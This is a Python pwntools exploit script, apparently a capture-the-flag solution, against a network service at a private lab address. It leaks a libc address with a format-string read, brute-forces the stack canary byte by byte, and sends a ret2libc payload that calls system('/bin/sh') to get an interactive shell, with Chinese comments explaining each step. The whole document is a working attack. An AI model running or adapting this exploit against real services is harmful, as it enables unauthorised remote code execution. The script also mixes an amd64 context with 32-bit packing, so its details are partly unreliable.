#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(os = 'linux', arch = 'amd64')

io = remote('172.17.0.3', 10001)

canary = '\x00'
for i in xrange(3):
	for j in xrange(256):
		io.sendline('Y')
		io.recv()
		io.sendline('%19$p') 	#泄露栈上的libc地址
		io.recvuntil('game ')
		leak_libc_addr = int(io.recv(10), 16)
		
		io.recv()
		payload = 'A'*16			#构造payload爆破canary
		payload += canary
		payload += chr(j)
		io.send(payload)
		io.recv()
		if ("" != io.recv(timeout = 0.1)):		#如果canary的字节位爆破正确，应该输出两个"[*] Do you love me?"，因此通过第二个recv的结果判断是否成功
			canary += chr(j)
			log.info('At round %d find canary byte %#x' %(i, j))
			break

log.info('Canary is %#x' %(u32(canary)))
system_addr = leak_libc_addr - 0x2ed3b + 0x3b060
binsh_addr = leak_libc_addr - 0x2ed3b + 0x15fa0f
log.info('System address is at %#x, /bin/sh address is at %#x' %(system_addr, binsh_addr))

payload = ''					#构造payload执行system('/bin/sh')
payload += 'A'*16
payload += canary
payload += 'B'*12
payload += p32(system_addr)
payload += 'CCCC'
payload += p32(binsh_addr)

io.sendline('Y')				#[*] Do you love me?
io.recv()
io.sendline('1')				#[*] Input Your name please: 随便一个输入
io.recv()
io.send(payload)				#[*] Input Your Id: 漏洞产生点
io.interactive()


